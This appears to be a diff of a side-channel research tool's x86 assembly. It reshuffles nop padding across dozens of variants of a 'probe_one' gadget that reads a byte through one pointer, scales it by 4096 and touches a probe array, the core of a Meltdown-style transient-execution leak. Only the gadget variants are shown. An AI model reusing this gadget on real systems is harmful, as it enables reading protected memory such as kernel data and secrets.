 .Lprobe_one_win0_var171:
@@ -3676,42 +3676,42 @@ probe_one:
 	movb	(%rdx), %al
 	nop
 	nop
-	nop
 	shlq	$0xc, %rax
 	jz	92b
 	nop
+	nop
+	nop
+	nop
 	movq	(%rcx, %rax, 1), %rbx
-	nop
-	nop
 	jmp	.Lprobe_one_win0_continue
 ## Variant 172
 .Lprobe_one_win0_var172:
 	popq	%rax
 	addq	$32, %rsp
+	nop
+	nop
 	movb	(%rdx), %al
+	nop
 	shlq	$0xc, %rax
+	nop
+	nop
 	jz	92b
 	nop
-	nop
-	nop
-	nop
 	movq	(%rcx, %rax, 1), %rbx
-	nop
-	nop
 	jmp	.Lprobe_one_win0_continue
 ## Variant 173
 .Lprobe_one_win0_var173:
 	popq	%rax
 	addq	$32, %rsp
 	nop
+	nop
 	movb	(%rdx), %al
 	shlq	$0xc, %rax
-	nop
-	nop
-	nop
 	jz	92b
 	nop
+	nop
 	movq	(%rcx, %rax, 1), %rbx
+	nop
 	nop
 	jmp	.Lprobe_one_win0_continue
 ## Variant 174
@@ -3719,43 +3719,43 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	nop
+	nop
+	nop
 	movb	(%rdx), %al
 	nop
 	shlq	$0xc, %rax
-	nop
-	nop
-	nop
-	nop
 	jz	92b
+	nop
+	nop
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 175
 .Lprobe_one_win0_var175:
 	popq	%rax
 	addq	$32, %rsp
+	nop
+	nop
+	nop
 	movb	(%rdx), %al
+	nop
 	nop
 	shlq	$0xc, %rax
 	nop
-	nop
-	nop
 	jz	92b
-	nop
-	nop
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 176
 .Lprobe_one_win0_var176:
 	popq	%rax
 	addq	$32, %rsp
+	nop
+	nop
 	movb	(%rdx), %al
+	nop
 	shlq	$0xc, %rax
 	nop
 	nop
-	nop
 	jz	92b
-	nop
-	nop
 	nop
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
@@ -3763,31 +3763,31 @@ probe_one:
 .Lprobe_one_win0_var177:
 	popq	%rax
 	addq	$32, %rsp
-	nop
 	movb	(%rdx), %al
 	nop
-	nop
-	nop
 	shlq	$0xc, %rax
+	nop
 	jz	92b
 	nop
 	nop
+	nop
 	movq	(%rcx, %rax, 1), %rbx
+	nop
 	jmp	.Lprobe_one_win0_continue
 ## Variant 178
 .Lprobe_one_win0_var178:
 	popq	%rax
 	addq	$32, %rsp
 	nop
-	nop
-	nop
 	movb	(%rdx), %al
 	nop
 	nop
 	nop
 	shlq	$0xc, %rax
 	jz	92b
+	nop
 	movq	(%rcx, %rax, 1), %rbx
+	nop
 	jmp	.Lprobe_one_win0_continue
 ## Variant 179
 .Lprobe_one_win0_var179:
@@ -3798,22 +3798,22 @@ probe_one:
 	nop
 	nop
 	shlq	$0xc, %rax
+	nop
+	nop
+	nop
 	jz	92b
-	nop
-	nop
-	nop
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 180
 .Lprobe_one_win0_var180:
 	popq	%rax
 	addq	$32, %rsp
-	nop
 	movb	(%rdx), %al
 	nop
 	nop
 	nop
 	shlq	$0xc, %rax
+	nop
 	nop
 	jz	92b
 	movq	(%rcx, %rax, 1), %rbx
@@ -3823,45 +3823,45 @@ probe_one:
 .Lprobe_one_win0_var181:
 	popq	%rax
 	addq	$32, %rsp
-	nop
-	nop
-	nop
 	movb	(%rdx), %al
 	nop
 	nop
-	shlq	$0xc, %rax
 	nop
+	nop
+	shlq	$0xc, %rax
 	jz	92b
+	nop
+	nop
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 182
 .Lprobe_one_win0_var182:
 	popq	%rax
 	addq	$32, %rsp
+	nop
+	nop
+	nop
 	movb	(%rdx), %al
+	nop
 	nop
 	shlq	$0xc, %rax
 	nop
-	nop
-	nop
 	jz	92b
-	nop
 	movq	(%rcx, %rax, 1), %rbx
-	nop
 	jmp	.Lprobe_one_win0_continue
 ## Variant 183
 .Lprobe_one_win0_var183:
 	popq	%rax
 	addq	$32, %rsp
-	nop
-	nop
 	movb	(%rdx), %al
 	nop
 	shlq	$0xc, %rax
 	nop
 	jz	92b
-	nop
 	movq	(%rcx, %rax, 1), %rbx
+	nop
+	nop
+	nop
 	nop
 	jmp	.Lprobe_one_win0_continue
 ## Variant 184
@@ -3869,28 +3869,28 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	nop
+	nop
 	movb	(%rdx), %al
-	nop
-	nop
-	nop
 	shlq	$0xc, %rax
+	nop
 	nop
 	nop
 	jz	92b
 	movq	(%rcx, %rax, 1), %rbx
+	nop
 	jmp	.Lprobe_one_win0_continue
 ## Variant 185
 .Lprobe_one_win0_var185:
 	popq	%rax
 	addq	$32, %rsp
-	nop
-	nop
-	nop
 	movb	(%rdx), %al
-	shlq	$0xc, %rax
 	nop
+	nop
+	shlq	$0xc, %rax
 	jz	92b
 	movq	(%rcx, %rax, 1), %rbx
+	nop
+	nop
 	nop
 	nop
 	jmp	.Lprobe_one_win0_continue
@@ -3898,61 +3898,61 @@ probe_one:
 .Lprobe_one_win0_var186:
 	popq	%rax
 	addq	$32, %rsp
-	nop
-	nop
-	nop
 	movb	(%rdx), %al
-	nop
 	shlq	$0xc, %rax
+	nop
 	jz	92b
 	nop
 	nop
+	nop
 	movq	(%rcx, %rax, 1), %rbx
+	nop
+	nop
 	jmp	.Lprobe_one_win0_continue
 ## Variant 187
 .Lprobe_one_win0_var187:
 	popq	%rax
 	addq	$32, %rsp
 	nop
-	nop
-	nop
 	movb	(%rdx), %al
-	nop
-	nop
 	nop
 	shlq	$0xc, %rax
 	jz	92b
+	nop
+	nop
+	nop
 	movq	(%rcx, %rax, 1), %rbx
+	nop
 	jmp	.Lprobe_one_win0_continue
 ## Variant 188
 .Lprobe_one_win0_var188:
 	popq	%rax
 	addq	$32, %rsp
-	nop
 	movb	(%rdx), %al
-	shlq	$0xc, %rax
 	nop
+	nop
+	shlq	$0xc, %rax
 	jz	92b
 	nop
-	nop
-	nop
-	nop
 	movq	(%rcx, %rax, 1), %rbx
+	nop
+	nop
+	nop
 	jmp	.Lprobe_one_win0_continue
 ## Variant 189
 .Lprobe_one_win0_var189:
 	popq	%rax
 	addq	$32, %rsp
+	nop
+	nop
 	movb	(%rdx), %al
-	nop
-	nop
-	nop
 	shlq	$0xc, %rax
-	nop
 	jz	92b
+	nop
+	nop
+	nop
+	nop
 	movq	(%rcx, %rax, 1), %rbx
-	nop
-	nop
 	jmp	.Lprobe_one_win0_continue
 ## Variant 190
 .Lprobe_one_win0_var190:
@@ -3961,11 +3961,11 @@ probe_one:
 	nop
 	nop
 	nop
-	nop
 	movb	(%rdx), %al
 	nop
-	shlq	$0xc, %rax
 	nop
+	nop
+	shlq	$0xc, %rax
 	jz	92b
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
@@ -3973,30 +3973,30 @@ probe_one:
 .Lprobe_one_win0_var191:
 	popq	%rax
 	addq	$32, %rsp
+	nop
+	nop
+	nop
+	nop
 	movb	(%rdx), %al
+	nop
 	shlq	$0xc, %rax
+	nop
 	jz	92b
-	nop
-	nop
 	movq	(%rcx, %rax, 1), %rbx
-	nop
-	nop
-	nop
-	nop
 	jmp	.Lprobe_one_win0_continue
 ## Variant 192
 .Lprobe_one_win0_var192:
 	popq	%rax
 	addq	$32, %rsp
-	nop
 	movb	(%rdx), %al
 	shlq	$0xc, %rax
 	nop
-	nop
-	nop
 	jz	92b
-	movq	(%rcx, %rax, 1), %rbx
 	nop
+	nop
+	nop
+	nop
+	movq	(%rcx, %rax, 1), %rbx
 	nop
 	jmp	.Lprobe_one_win0_continue
 ## Variant 193
@@ -4005,36 +4005,34 @@ probe_one:
 	addq	$32, %rsp
 	nop
 	nop
+	nop
+	nop
 	movb	(%rdx), %al
+	nop
+	nop
 	shlq	$0xc, %rax
 	jz	92b
-	nop
-	nop
-	nop
 	movq	(%rcx, %rax, 1), %rbx
-	nop
 	jmp	.Lprobe_one_win0_continue
 ## Variant 194
 .Lprobe_one_win0_var194:
 	popq	%rax
 	addq	$32, %rsp
+	nop
+	nop
 	movb	(%rdx), %al
-	nop
-	nop
 	shlq	$0xc, %rax
-	nop
 	jz	92b
 	nop
-	nop
 	movq	(%rcx, %rax, 1), %rbx
+	nop
+	nop
 	nop
 	jmp	.Lprobe_one_win0_continue
 ## Variant 195
 .Lprobe_one_win0_var195:
 	popq	%rax
 	addq	$32, %rsp
-	nop
-	nop
 	movb	(%rdx), %al
 	nop
 	shlq	$0xc, %rax
@@ -4043,21 +4041,23 @@ probe_one:
 	nop
 	jz	92b
 	movq	(%rcx, %rax, 1), %rbx
+	nop
+	nop
 	jmp	.Lprobe_one_win0_continue
 ## Variant 196
 .Lprobe_one_win0_var196:
 	popq	%rax
 	addq	$32, %rsp
 	nop
-	movb	(%rdx), %al
 	nop
+	nop
+	movb	(%rdx), %al
 	shlq	$0xc, %rax
 	nop
 	nop
 	nop
 	jz	92b
 	movq	(%rcx, %rax, 1), %rbx
-	nop
 	jmp	.Lprobe_one_win0_continue
 ## Variant 197
 .Lprobe_one_win0_var197:
@@ -4068,8 +4068,8 @@ probe_one:
 	nop
 	shlq	$0xc, %rax
 	nop
-	jz	92b
 	nop
+	jz	92b
 	nop
 	nop
 	movq	(%rcx, %rax, 1), %rbx
@@ -4080,14 +4080,14 @@ probe_one:
 	addq	$32, %rsp
 	movb	(%rdx), %al
 	nop
+	nop
+	nop
 	shlq	$0xc, %rax
-	nop
-	nop
-	nop
-	nop
 	jz	92b
 	nop
 	movq	(%rcx, %rax, 1), %rbx
+	nop
+	nop
 	jmp	.Lprobe_one_win0_continue
 ## Variant 199
 .Lprobe_one_win0_var199:
@@ -4095,13 +4095,13 @@ probe_one:
 	addq	$32, %rsp
 	nop
 	nop
+	nop
+	nop
 	movb	(%rdx), %al
-	nop
-	nop
 	shlq	$0xc, %rax
+	nop
 	jz	92b
 	movq	(%rcx, %rax, 1), %rbx
-	nop
 	nop
 	jmp	.Lprobe_one_win0_continue
 ## Variant 200
@@ -4109,6 +4109,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
+	nop
+	nop
 	shlq	$0xc, %rax
 	nop
 	nop
@@ -4116,21 +4118,19 @@ probe_one:
 	nop
 	nop
 	movq	(%rcx, %rax, 1), %rbx
-	nop
-	nop
 	jmp	.Lprobe_one_win0_continue
 ## Variant 201
 .Lprobe_one_win0_var201:
 	popq	%rax
 	addq	$32, %rsp
+	nop
+	nop
 	movb	(%rdx), %al
+	nop
+	nop
+	nop
 	shlq	$0xc, %rax
-	nop
-	nop
 	jz	92b
-	nop
-	nop
-	nop
 	movq	(%rcx, %rax, 1), %rbx
 	nop
 	jmp	.Lprobe_one_win0_continue
@@ -4144,69 +4144,69 @@ probe_one:
 	shlq	$0xc, %rax
 	nop
 	nop
-	nop
-	nop
 	jz	92b
+	nop
 	movq	(%rcx, %rax, 1), %rbx
+	nop
 	jmp	.Lprobe_one_win0_continue
 ## Variant 203
 .Lprobe_one_win0_var203:
 	popq	%rax
 	addq	$32, %rsp
+	nop
 	movb	(%rdx), %al
-	nop
 	shlq	$0xc, %rax
-	nop
 	jz	92b
 	nop
 	nop
 	nop
 	movq	(%rcx, %rax, 1), %rbx
+	nop
 	nop
 	jmp	.Lprobe_one_win0_continue
 ## Variant 204
 .Lprobe_one_win0_var204:
 	popq	%rax
 	addq	$32, %rsp
-	nop
 	movb	(%rdx), %al
 	nop
-	nop
-	nop
-	nop
 	shlq	$0xc, %rax
-	jz	92b
-	movq	(%rcx, %rax, 1), %rbx
 	nop
+	jz	92b
+	nop
+	nop
+	nop
+	nop
+	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 205
 .Lprobe_one_win0_var205:
 	popq	%rax
 	addq	$32, %rsp
+	nop
 	movb	(%rdx), %al
-	nop
-	nop
-	nop
-	nop
-	nop
-	nop
 	shlq	$0xc, %rax
 	jz	92b
+	nop
 	movq	(%rcx, %rax, 1), %rbx
+	nop
+	nop
+	nop
+	nop
 	jmp	.Lprobe_one_win0_continue
 ## Variant 206
 .Lprobe_one_win0_var206:
 	popq	%rax
 	addq	$32, %rsp
 	nop
-	nop
-	nop
-	nop
-	nop
 	movb	(%rdx), %al
-	nop
 	shlq	$0xc, %rax
+	nop
+	nop
+	nop
+	nop
 	jz	92b
+	nop
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 207
@@ -4214,11 +4214,11 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	nop
-	nop
-	nop
 	movb	(%rdx), %al
 	nop
 	shlq	$0xc, %rax
+	nop
+	nop
 	nop
 	jz	92b
 	nop
@@ -4228,29 +4228,29 @@ probe_one:
 .Lprobe_one_win0_var208:
 	popq	%rax
 	addq	$32, %rsp
+	nop
+	nop
+	nop
+	nop
+	nop
 	movb	(%rdx), %al
-	nop
 	shlq	$0xc, %rax
-	nop
-	nop
 	jz	92b
 	nop
-	nop
 	movq	(%rcx, %rax, 1), %rbx
-	nop
 	jmp	.Lprobe_one_win0_continue
 ## Variant 209
 .Lprobe_one_win0_var209:
 	popq	%rax
 	addq	$32, %rsp
-	nop
 	movb	(%rdx), %al
 	shlq	$0xc, %rax
-	nop
 	nop
 	jz	92b
 	nop
 	movq	(%rcx, %rax, 1), %rbx
+	nop
+	nop
 	nop
 	nop
 	jmp	.Lprobe_one_win0_continue
@@ -4259,28 +4259,28 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	nop
-	nop
 	movb	(%rdx), %al
-	nop
 	shlq	$0xc, %rax
+	nop
+	nop
+	nop
+	nop
 	jz	92b
 	movq	(%rcx, %rax, 1), %rbx
-	nop
-	nop
 	nop
 	jmp	.Lprobe_one_win0_continue
 ## Variant 211
 .Lprobe_one_win0_var211:
 	popq	%rax
 	addq	$32, %rsp
+	nop
+	nop
 	movb	(%rdx), %al
 	nop
 	nop
 	shlq	$0xc, %rax
+	nop
 	jz	92b
-	nop
-	nop
-	nop
 	nop
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
@@ -4290,27 +4290,27 @@ probe_one:
 	addq	$32, %rsp
 	nop
 	nop
-	nop
-	nop
 	movb	(%rdx), %al
 	shlq	$0xc, %rax
+	nop
+	nop
+	nop
 	jz	92b
 	movq	(%rcx, %rax, 1), %rbx
-	nop
 	nop
 	jmp	.Lprobe_one_win0_continue
 ## Variant 213
 .Lprobe_one_win0_var213:
 	popq	%rax
 	addq	$32, %rsp
+	nop
+	nop
 	movb	(%rdx), %al
-	nop
-	nop
-	nop
 	shlq	$0xc, %rax
 	jz	92b
-	movq	(%rcx, %rax, 1), %rbx
 	nop
+	nop
+	movq	(%rcx, %rax, 1), %rbx
 	nop
 	nop
 	jmp	.Lprobe_one_win0_continue
@@ -4319,43 +4319,43 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	nop
+	nop
+	nop
+	nop
+	nop
 	movb	(%rdx), %al
-	nop
-	nop
 	shlq	$0xc, %rax
-	nop
 	jz	92b
 	nop
 	movq	(%rcx, %rax, 1), %rbx
-	nop
 	jmp	.Lprobe_one_win0_continue
 ## Variant 215
 .Lprobe_one_win0_var215:
 	popq	%rax
 	addq	$32, %rsp
-	nop
 	movb	(%rdx), %al
-	nop
-	nop
 	nop
 	nop
 	shlq	$0xc, %rax
 	nop
+	nop
 	jz	92b
 	movq	(%rcx, %rax, 1), %rbx
+	nop
+	nop
 	jmp	.Lprobe_one_win0_continue
 ## Variant 216
 .Lprobe_one_win0_var216:
 	popq	%rax
 	addq	$32, %rsp
-	nop
-	nop
 	movb	(%rdx), %al
+	nop
 	shlq	$0xc, %rax
 	jz	92b
 	nop
-	movq	(%rcx, %rax, 1), %rbx
 	nop
+	nop
+	movq	(%rcx, %rax, 1), %rbx
 	nop
 	nop
 	jmp	.Lprobe_one_win0_continue
@@ -4367,41 +4367,41 @@ probe_one:
 	nop
 	nop
 	nop
+	nop
+	nop
 	shlq	$0xc, %rax
+	nop
 	jz	92b
 	movq	(%rcx, %rax, 1), %rbx
-	nop
-	nop
-	nop
 	jmp	.Lprobe_one_win0_continue
 ## Variant 218
 .Lprobe_one_win0_var218:
 	popq	%rax
 	addq	$32, %rsp
-	nop
 	movb	(%rdx), %al
-	nop
-	nop
 	shlq	$0xc, %rax
+	nop
+	nop
 	nop
 	jz	92b
 	nop
-	movq	(%rcx, %rax, 1), %rbx
 	nop
+	nop
+	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 219
 .Lprobe_one_win0_var219:
 	popq	%rax
 	addq	$32, %rsp
 	nop
+	nop
+	nop
 	movb	(%rdx), %al
 	nop
 	shlq	$0xc, %rax
+	nop
 	jz	92b
-	nop
-	nop
 	movq	(%rcx, %rax, 1), %rbx
-	nop
 	nop
 	jmp	.Lprobe_one_win0_continue
 ## Variant 220
@@ -4409,11 +4409,11 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	nop
-	nop
-	nop
 	movb	(%rdx), %al
 	nop
 	shlq	$0xc, %rax
+	nop
+	nop
 	nop
 	nop
 	jz	92b
@@ -4423,31 +4423,31 @@ probe_one:
 .Lprobe_one_win0_var221:
 	popq	%rax
 	addq	$32, %rsp
-	nop
-	nop
 	movb	(%rdx), %al
 	shlq	$0xc, %rax
 	nop
+	nop
+	nop
+	nop
 	jz	92b
-	nop
-	nop
 	movq	(%rcx, %rax, 1), %rbx
+	nop
 	nop
 	jmp	.Lprobe_one_win0_continue
 ## Variant 222
 .Lprobe_one_win0_var222:
 	popq	%rax
 	addq	$32, %rsp
+	nop
+	nop
+	nop
 	movb	(%rdx), %al
+	nop
 	nop
 	nop
 	shlq	$0xc, %rax
 	jz	92b
-	nop
 	movq	(%rcx, %rax, 1), %rbx
-	nop
-	nop
-	nop
 	jmp	.Lprobe_one_win0_continue
 ## Variant 223
 .Lprobe_one_win0_var223:
@@ -4460,36 +4460,36 @@ probe_one:
 	nop
 	shlq	$0xc, %rax
 	jz	92b
-	nop
-	nop
 	movq	(%rcx, %rax, 1), %rbx
+	nop
+	nop
 	jmp	.Lprobe_one_win0_continue
 ## Variant 224
 .Lprobe_one_win0_var224:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	nop
-	nop
-	nop
-	nop
 	shlq	$0xc, %rax
 	jz	92b
 	nop
+	nop
 	movq	(%rcx, %rax, 1), %rbx
+	nop
+	nop
+	nop
 	nop
 	jmp	.Lprobe_one_win0_continue
 ## Variant 225
 .Lprobe_one_win0_var225:
 	popq	%rax
 	addq	$32, %rsp
+	nop
 	movb	(%rdx), %al
+	nop
 	shlq	$0xc, %rax
 	nop
 	nop
 	jz	92b
-	nop
-	nop
 	nop
 	movq	(%rcx, %rax, 1), %rbx
 	nop
@@ -4502,10 +4502,10 @@ probe_one:
 	nop
 	movb	(%rdx), %al
 	shlq	$0xc, %rax
+	nop
+	nop
 	jz	92b
 	movq	(%rcx, %rax, 1), %rbx
-	nop
-	nop
 	nop
 	nop
 	jmp	.Lprobe_one_win0_continue
@@ -4517,9 +4517,9 @@ probe_one:
 	movb	(%rdx), %al
 	nop
 	nop
+	nop
+	nop
 	shlq	$0xc, %rax
-	nop
-	nop
 	jz	92b
 	nop
 	movq	(%rcx, %rax, 1), %rbx
@@ -4528,15 +4528,15 @@ probe_one:
 .Lprobe_one_win0_var228:
 	popq	%rax
 	addq	$32, %rsp
-	nop
-	nop
-	nop
 	movb	(%rdx), %al
-	nop
 	shlq	$0xc, %rax
 	jz	92b
 	nop
 	movq	(%rcx, %rax, 1), %rbx
+	nop
+	nop
+	nop
+	nop
 	nop
 	jmp	.Lprobe_one_win0_continue
 ## Variant 229
@@ -4545,27 +4545,27 @@ probe_one:
 	addq	$32, %rsp
 	nop
 	nop
-	nop
-	nop
 	movb	(%rdx), %al
-	nop
 	shlq	$0xc, %rax
+	nop
 	jz	92b
 	nop
 	movq	(%rcx, %rax, 1), %rbx
+	nop
+	nop
 	jmp	.Lprobe_one_win0_continue
 ## Variant 230
 .Lprobe_one_win0_var230:
 	popq	%rax
 	addq	$32, %rsp
 	nop
-	nop
 	movb	(%rdx), %al
+	nop
 	shlq	$0xc, %rax
-	nop
-	nop
 	jz	92b
 	movq	(%rcx, %rax, 1), %rbx
+	nop
+	nop
 	nop
 	nop
 	jmp	.Lprobe_one_win0_continue
@@ -4573,13 +4573,13 @@ probe_one:
 .Lprobe_one_win0_var231:
 	popq	%rax
 	addq	$32, %rsp
+	nop
 	movb	(%rdx), %al
+	nop
+	nop
+	nop
 	shlq	$0xc, %rax
-	nop
-	nop
-	nop
 	jz	92b
-	nop
 	nop
 	movq	(%rcx, %rax, 1), %rbx
 	nop
@@ -4588,24 +4588,24 @@ probe_one:
 .Lprobe_one_win0_var232:
 	popq	%rax
 	addq	$32, %rsp
+	nop
+	nop
 	movb	(%rdx), %al
+	nop
+	nop
 	shlq	$0xc, %rax
 	jz	92b
 	nop
 	nop
-	nop
-	nop
 	movq	(%rcx, %rax, 1), %rbx
-	nop
-	nop
 	jmp	.Lprobe_one_win0_continue
 ## Variant 233
 .Lprobe_one_win0_var233:
 	popq	%rax
 	addq	$32, %rsp
+	nop
+	nop
 	movb	(%rdx), %al
-	nop
-	nop
 	nop
 	shlq	$0xc, %rax
 	nop
@@ -4625,23 +4625,23 @@ probe_one:
 	nop
 	jz	92b
 	nop
-	movq	(%rcx, %rax, 1), %rbx
 	nop
+	movq	(%rcx, %rax, 1), %rbx
 	nop
 	jmp	.Lprobe_one_win0_continue
 ## Variant 235
 .Lprobe_one_win0_var235:
 	popq	%rax
 	addq	$32, %rsp
-	nop
-	nop
 	movb	(%rdx), %al
-	nop
-	nop
-	nop
 	shlq	$0xc, %rax
+	nop
+	nop
+	nop
 	jz	92b
+	nop
 	movq	(%rcx, %rax, 1), %rbx
+	nop
 	nop
 	jmp	.Lprobe_one_win0_continue
 ## Variant 236
@@ -4649,44 +4649,44 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	nop
+	nop
 	movb	(%rdx), %al
 	nop
 	nop
+	nop
 	shlq	$0xc, %rax
+	nop
 	jz	92b
-	nop
 	movq	(%rcx, %rax, 1), %rbx
-	nop
-	nop
 	jmp	.Lprobe_one_win0_continue
 ## Variant 237
 .Lprobe_one_win0_var237:
 	popq	%rax
 	addq	$32, %rsp
+	nop
 	movb	(%rdx), %al
-	nop
-	nop
 	shlq	$0xc, %rax
 	nop
-	nop
-	nop
 	jz	92b
+	nop
 	movq	(%rcx, %rax, 1), %rbx
+	nop
+	nop
 	nop
 	jmp	.Lprobe_one_win0_continue
 ## Variant 238
 .Lprobe_one_win0_var238:
 	popq	%rax
 	addq	$32, %rsp
+	nop
+	nop
 	movb	(%rdx), %al
+	nop
 	shlq	$0xc, %rax
 	nop
-	nop
-	nop
-	nop
 	jz	92b
-	nop
 	movq	(%rcx, %rax, 1), %rbx
+	nop
 	nop
 	jmp	.Lprobe_one_win0_continue
 ## Variant 239
@@ -4694,20 +4694,21 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
+	nop
+	nop
 	shlq	$0xc, %rax
 	nop
 	nop
 	nop
 	nop
 	jz	92b
-	nop
-	nop
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 240
 .Lprobe_one_win0_var240:
 	popq	%rax
 	addq	$32, %rsp
+	nop
 	movb	(%rdx), %al
 	shlq	$0xc, %rax
 	nop
@@ -4716,7 +4717,6 @@ probe_one:
 	nop
 	nop
 	jz	92b
-	nop
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 241
@@ -4724,74 +4724,74 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	nop
-	nop
-	nop
 	movb	(%rdx), %al
-	shlq	$0xc, %rax
 	nop
+	nop
+	nop
+	nop
+	nop
+	shlq	$0xc, %rax
 	jz	92b
 	movq	(%rcx, %rax, 1), %rbx
-	nop
-	nop
 	jmp	.Lprobe_one_win0_continue
 ## Variant 242
 .Lprobe_one_win0_var242:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	nop
-	nop
 	shlq	$0xc, %rax
+	nop
 	nop
 	jz	92b
 	nop
-	nop
-	nop
 	movq	(%rcx, %rax, 1), %rbx
+	nop
+	nop
+	nop
 	jmp	.Lprobe_one_win0_continue
 ## Variant 243
 .Lprobe_one_win0_var243:
 	popq	%rax
 	addq	$32, %rsp
 	nop
-	nop
-	nop
-	nop
 	movb	(%rdx), %al
-	shlq	$0xc, %rax
 	nop
+	shlq	$0xc, %rax
 	nop
 	jz	92b
 	movq	(%rcx, %rax, 1), %rbx
+	nop
+	nop
+	nop
 	jmp	.Lprobe_one_win0_continue
 ## Variant 244
 .Lprobe_one_win0_var244:
 	popq	%rax
 	addq	$32, %rsp
-	nop
-	nop
-	nop
 	movb	(%rdx), %al
-	nop
-	nop
 	shlq	$0xc, %rax
+	nop
 	jz	92b
 	nop
+	nop
 	movq	(%rcx, %rax, 1), %rbx
+	nop
+	nop
+	nop
 	jmp	.Lprobe_one_win0_continue
 ## Variant 245
 .Lprobe_one_win0_var245:
 	popq	%rax
 	addq	$32, %rsp
-	nop
-	nop
-	nop
 	movb	(%rdx), %al
+	nop
 	shlq	$0xc, %rax
 	jz	92b
 	nop
 	nop
 	movq	(%rcx, %rax, 1), %rbx
+	nop
+	nop
 	nop
 	jmp	.Lprobe_one_win0_continue
 ## Variant 246
@@ -4801,9 +4801,9 @@ probe_one:
 	movb	(%rdx), %al
 	nop
 	nop
+	nop
 	shlq	$0xc, %rax
 	jz	92b
-	nop
 	nop
 	movq	(%rcx, %rax, 1), %rbx
 	nop
@@ -4817,10 +4817,10 @@ probe_one:
 	movb	(%rdx), %al
 	shlq	$0xc, %rax
 	nop
-	nop
 	jz	92b
-	movq	(%rcx, %rax, 1), %rbx
 	nop
+	nop
+	movq	(%rcx, %rax, 1), %rbx
 	nop
 	nop
 	jmp	.Lprobe_one_win0_continue
@@ -4830,28 +4830,28 @@ probe_one:
 	addq	$32, %rsp
 	nop
 	nop
-	nop
-	nop
 	movb	(%rdx), %al
-	nop
 	shlq	$0xc, %rax
 	jz	92b
 	nop
 	movq	(%rcx, %rax, 1), %rbx
+	nop
+	nop
+	nop
 	jmp	.Lprobe_one_win0_continue
 ## Variant 249
 .Lprobe_one_win0_var249:
 	popq	%rax
 	addq	$32, %rsp
 	nop
+	nop
 	movb	(%rdx), %al
+	nop
 	nop
 	nop
 	shlq	$0xc, %rax
 	jz	92b
 	movq	(%rcx, %rax, 1), %rbx
-	nop
-	nop
 	nop
 	jmp	.Lprobe_one_win0_continue
 ## Variant 250
@@ -4864,37 +4864,37 @@ probe_one:
 	shlq	$0xc, %rax
 	nop
 	nop
+	nop
 	jz	92b
 	nop
 	movq	(%rcx, %rax, 1), %rbx
-	nop
 	jmp	.Lprobe_one_win0_continue
 ## Variant 251
 .Lprobe_one_win0_var251:
 	popq	%rax
 	addq	$32, %rsp
+	nop
+	nop
 	movb	(%rdx), %al
 	shlq	$0xc, %rax
+	nop
 	jz	92b
 	nop
 	nop
 	nop
-	nop
 	movq	(%rcx, %rax, 1), %rbx
-	nop
-	nop
 	jmp	.Lprobe_one_win0_continue
 ## Variant 252
 .Lprobe_one_win0_var252:
 	popq	%rax
 	addq	$32, %rsp
+	nop
 	movb	(%rdx), %al
 	nop
-	nop
 	shlq	$0xc, %rax
-	nop
-	nop
 	jz	92b
+	nop
+	nop
 	nop
 	nop
 	movq	(%rcx, %rax, 1), %rbx
@@ -4905,12 +4905,12 @@ probe_one:
 	addq	$32, %rsp
 	nop
 	nop
+	nop
 	movb	(%rdx), %al
-	nop
-	nop
 	nop
 	shlq	$0xc, %rax
 	jz	92b
+	nop
 	movq	(%rcx, %rax, 1), %rbx
 	nop
 	jmp	.Lprobe_one_win0_continue
@@ -4918,29 +4918,29 @@ probe_one:
 .Lprobe_one_win0_var254:
 	popq	%rax
 	addq	$32, %rsp
-	nop
-	nop
 	movb	(%rdx), %al
 	nop
 	shlq	$0xc, %rax
 	nop
+	nop
+	nop
+	nop
 	jz	92b
 	nop
 	movq	(%rcx, %rax, 1), %rbx
-	nop
 	jmp	.Lprobe_one_win0_continue
 ## Variant 255
 .Lprobe_one_win0_var255:
 	popq	%rax
 	addq	$32, %rsp
-	nop
-	nop
 	movb	(%rdx), %al
+	nop
+	nop
 	shlq	$0xc, %rax
+	nop
 	nop
 	jz	92b
 	movq	(%rcx, %rax, 1), %rbx
-	nop
 	nop
 	nop
 	jmp	.Lprobe_one_win0_continue
@@ -4948,13 +4948,13 @@ probe_one:
 .Lprobe_one_win0_var256:
 	popq	%rax
 	addq	$32, %rsp
-	nop
 	movb	(%rdx), %al
-	nop
 	shlq	$0xc, %rax
 	nop
 	nop
+	nop
 	jz	92b
+	nop
 	movq	(%rcx, %rax, 1), %rbx
 	nop
 	nop
@@ -4965,14 +4965,14 @@ probe_one:
 	addq	$32, %rsp
 	movb	(%rdx), %al
 	nop
-	shlq	$0xc, %rax
 	nop
+	shlq	$0xc, %rax
 	nop
 	nop
 	jz	92b
 	nop
-	nop
 	movq	(%rcx, %rax, 1), %rbx
+	nop
 	jmp	.Lprobe_one_win0_continue
 ## Variant 258
